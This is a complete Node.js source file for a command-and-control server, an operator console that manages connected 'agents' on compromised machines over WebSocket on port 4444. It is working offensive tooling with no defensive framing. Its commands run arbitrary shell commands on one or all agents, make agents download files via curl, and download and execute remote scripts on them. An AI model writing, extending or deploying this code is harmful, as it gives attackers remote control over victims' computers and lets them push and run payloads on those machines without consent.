// ============================================
// C2 SERVER — CLI Operator Console
// Usage: node server.js
// ============================================

const WebSocket = require('ws');
const readline = require('readline');

const PORT = 4444;
const wss = new WebSocket.Server({ port: PORT });

let agents = new Map();   // id -> ws
let counter = 1;
let selectedAgent = null; // currently selected agent id

console.log(`[*] C2 Server started on port ${PORT}`);
console.log(`[*] Waiting for agents...\n`);
console.log(`Type 'help' for commands.\n`);

// ── Agent connections ─────────────────────────
wss.on('connection', (ws, req) => {
    const id = counter++;
    const ip = req.socket.remoteAddress;
    agents.set(id, ws);

    console.log(`\n[+] Agent #${id} connected | IP: ${ip}`);

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            if (msg.type === 'info') {
                console.log(`[Agent #${id}] ${msg.data}`);
                // Auto-select first agent
                if (!selectedAgent) {
                    selectedAgent = id;
                    console.log(`[*] Auto-selected Agent #${id}`);
                }
            } else if (msg.type === 'output') {
                console.log(`\n┌─ Agent #${id} Output ──────────────────`);
                console.log(msg.data);
                console.log(`└───────────────────────────────────────`);
            }
        } catch (e) {
            console.log(`[Agent #${id}] ${data}`);
        }
        rl.prompt();
    });

    ws.on('close', () => {
        agents.delete(id);
        console.log(`\n[-] Agent #${id} disconnected.`);
        if (selectedAgent === id) selectedAgent = null;
        rl.prompt();
    });

    ws.on('error', () => {});
    rl.prompt();
});

// ── CLI ───────────────────────────────────────
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: () => selectedAgent ? `Agent#${selectedAgent}> ` : `C2> `
});

rl.setPrompt('C2> ');
rl.prompt();

rl.on('line', (line) => {
    const input = line.trim();
    if (!input) { rl.prompt(); return; }

    // ── Built-in commands ──────────────────────
    if (input === 'help') {
        console.log(`
Commands:
  list                  — List connected agents
  use <id>              — Select an agent to interact with
  exec <cmd>            — Run shell command on selected agent
  download <url>        — Download file via curl on agent
  run <url>             — Download + execute script on agent
  broadcast <cmd>       — Send shell command to ALL agents
  exit                  — Shutdown server
  
  (or just type any shell command — it runs on selected agent)
`);
        rl.prompt();
        return;
    }

    if (input === 'list') {
        if (agents.size === 0) {
            console.log('[*] No agents connected.');
        } else {
            console.log(`[*] Connected agents:`);
            agents.forEach((ws, id) => {
                const mark = id === selectedAgent ? ' ← selected' : '';
                console.log(`    #${id}${mark}`);
            });
        }
        rl.prompt();
        return;
    }

    if (input === 'exit') {
        console.log('[*] Shutting down...');
        process.exit(0);
    }

    const useMatch = input.match(/^use\s+(\d+)$/);
    if (useMatch) {
        const id = parseInt(useMatch[1]);
        if (agents.has(id)) {
            selectedAgent = id;
            rl.setPrompt(`Agent#${id}> `);
            console.log(`[*] Now targeting Agent #${id}`);
        } else {
            console.log(`[!] Agent #${id} not found.`);
        }
        rl.prompt();
        return;
    }

    const broadcastMatch = input.match(/^broadcast\s+(.+)$/);
    if (broadcastMatch) {
        const cmd = broadcastMatch[1];
        agents.forEach((ws, id) => {
            ws.send(JSON.stringify({ type: 'exec', cmd }));
        });
        console.log(`[>] Broadcast to ${agents.size} agent(s): ${cmd}`);
        rl.prompt();
        return;
    }

    // ── Commands to selected agent ─────────────
    if (!selectedAgent || !agents.has(selectedAgent)) {
        console.log('[!] No agent selected. Use "use <id>" or wait for an agent to connect.');
        rl.prompt();
        return;
    }

    const ws = agents.get(selectedAgent);

    const downloadMatch = input.match(/^download\s+(\S+)$/);
    if (downloadMatch) {
        ws.send(JSON.stringify({ type: 'download', url: downloadMatch[1] }));
        rl.prompt();
        return;
    }

    const runMatch = input.match(/^run\s+(\S+)$/);
    if (runMatch) {
        ws.send(JSON.stringify({ type: 'run', url: runMatch[1] }));
        rl.prompt();
        return;
    }

    const execMatch = input.match(/^exec\s+(.+)$/);
    if (execMatch) {
        ws.send(JSON.stringify({ type: 'exec', cmd: execMatch[1] }));
        rl.prompt();
        return;
    }

    // ── Any other input = shell command ───────
    ws.send(JSON.stringify({ type: 'exec', cmd: input }));
    rl.prompt();
});
